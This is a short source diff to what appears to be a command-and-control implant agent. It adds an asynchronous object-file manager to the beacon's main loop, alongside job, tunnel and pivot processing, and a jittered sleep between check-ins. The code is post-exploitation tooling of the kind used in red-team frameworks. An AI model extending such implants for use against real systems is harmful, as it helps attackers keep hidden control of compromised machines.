@@ -4,6 +4,7 @@
 #include "utils.h"
 #include "Crypt.h"
 #include "WaitMask.h"
+#include "Boffer.h"
 #include "Connector.h"
 
 #if defined(BEACON_HTTP)
@@ -40,6 +41,9 @@ DWORD WINAPI AgentMain(LPVOID lpParam)
 	g_Agent = new Agent();
 	g_Connector = CreateConnector();
 
+	g_AsyncBofManager = new Boffer();
+	g_AsyncBofManager->Initialize();
+
 	ULONG beatSize = 0;
 	BYTE* beat = g_Agent->BuildBeat(&beatSize);
 
@@ -74,6 +78,12 @@ DWORD WINAPI AgentMain(LPVOID lpParam)
 			g_Agent->jober->ProcessJobs(packerOut);
 			g_Agent->proxyfire->ProcessTunnels(packerOut);
 			g_Agent->pivotter->ProcessPivots(packerOut);
+			g_AsyncBofManager->ProcessAsyncBofs(packerOut);
+
+			if (g_Agent->IsActive()) {
+				const BOOL hasOutput = (packerOut->datasize() >= 8);
+				g_Connector->Sleep(g_AsyncBofManager->GetWakeupEvent(), g_Agent->GetWorkingSleep(), g_Agent->config->sleep_delay, g_Agent->config->jitter_delay, hasOutput);
+			}
 
 		} while (g_Connector->IsConnected() && g_Agent->IsActive());
 
